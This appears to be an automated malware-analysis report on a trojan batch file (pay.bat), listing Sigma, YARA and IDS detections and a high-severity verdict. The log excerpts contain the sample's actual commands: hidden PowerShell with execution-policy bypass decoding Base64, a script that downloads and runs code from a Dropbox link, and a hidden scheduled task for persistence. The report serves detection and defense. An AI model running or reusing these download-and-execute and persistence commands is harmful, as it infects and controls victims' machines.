sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\george\Desktop\pay.bat" "; CommandLine=powershell /W 1 -ep bypass -w hidden -command $cmkGnaBV=[Convert]::FromBase64String(' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects usage of the "FromBase64String" function in the commandline which is used to decode a base64 encoded string

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\george\Desktop\pay.bat" "; CommandLine=powershell /W 1 -ep bypass -w hidden -command $cmkGnaBV=[Convert]::FromBase64String(' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\george\Desktop\pay.bat" "; CommandLine=powershell /W 1 -ep bypass -w hidden -command $cmkGnaBV=[Convert]::FromBase64String(' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=$ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/dkuamlrlsrbygso1swn8p/santa2-f.txt?rlkey=r8fe0viier1mwv9azk5awy5s9&st=yvqqfdfy&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;'; $str | Out-File -FilePath $ppp -Encoding UTF8; $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-WindowStyle Hidden -nop  -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& {$ [TRUNCATED]; Path=; ScriptBlockId=764b5695-9203-4627-a3e2-53846d1bf901; MessageTotal=1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/dkuamlrlsrbygso1swn8p/santa2-f.txt?rlkey=r8fe0viier1mwv9azk5awy5s9&st=yvqqfdfy&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;'; $str | Out-File -FilePath $ppp -Encoding UTF8; $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-WindowStyle Hidden -nop  -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& {$ [TRUNCATED]; Path=; ScriptBlockId=5a5cae5b-c5b7-4d16-b79a-48343e06597d; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code

match_context.values: @{ScriptBlockText=$ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/dkuamlrlsrbygso1swn8p/santa2-f.txt?rlkey=r8fe0viier1mwv9azk5awy5s9&st=yvqqfdfy&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;'; $str | Out-File -FilePath $ppp -Encoding UTF8; $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-WindowStyle Hidden -nop  -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& {$ [TRUNCATED]; MessageTotal=1; ScriptBlockId=764b5695-9203-4627-a3e2-53846d1bf901; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask'
$script:ClassVersion = ''
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\ [TRUNCATED]; Path=; ScriptBlockId=36bf5f28-4f52-45c8-9cb4-9e1996aee7f1; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=$ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/dkuamlrlsrbygso1swn8p/santa2-f.txt?rlkey=r8fe0viier1mwv9azk5awy5s9&st=yvqqfdfy&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;'; $str | Out-File -FilePath $ppp -Encoding UTF8; $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-WindowStyle Hidden -nop  -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& {$ [TRUNCATED]; Path=; ScriptBlockId=764b5695-9203-4627-a3e2-53846d1bf901; MessageTotal=1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/dkuamlrlsrbygso1swn8p/santa2-f.txt?rlkey=r8fe0viier1mwv9azk5awy5s9&st=yvqqfdfy&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;'; $str | Out-File -FilePath $ppp -Encoding UTF8; $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-WindowStyle Hidden -nop  -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& {$ [TRUNCATED]; MessageTotal=1; ScriptBlockId=5a5cae5b-c5b7-4d16-b79a-48343e06597d; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/dkuamlrlsrbygso1swn8p/santa2-f.txt?rlkey=r8fe0viier1mwv9azk5awy5s9&st=yvqqfdfy&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;
; Path=C:\Users\george\AppData\Roaming\chrome.ps1; ScriptBlockId=b029ff66-b52f-4929-836b-3c3c39f9cf74; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\george\Desktop\pay.bat" "; CommandLine=powershell /W 1 -ep bypass -w hidden -command $cmkGnaBV=[Convert]::FromBase64String(' [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.

crowdsourced_yara_results.description: This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: This signature detects base64 encoded Powershell directives.
crowdsourced_yara_results.author: InQuest Labs

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

attributes.magic: DOS batch file, ASCII text, with very long lines (1674u), with CRLF line terminators

crowdsourced_ids_results.rule_msg: ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)

crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)"; flow:established,to_server; tls.sni; content:"dl.dropboxusercontent.com"; bsize:25; fast_pattern; classtype:misc-activity; sid:2035593; rev:1; metadata:attack_target Client_Endpoint, created_at 2022_03_24, deployment Perimeter, performance_impact Low, signature_severity Informational, updated_at 2022_03_24;)
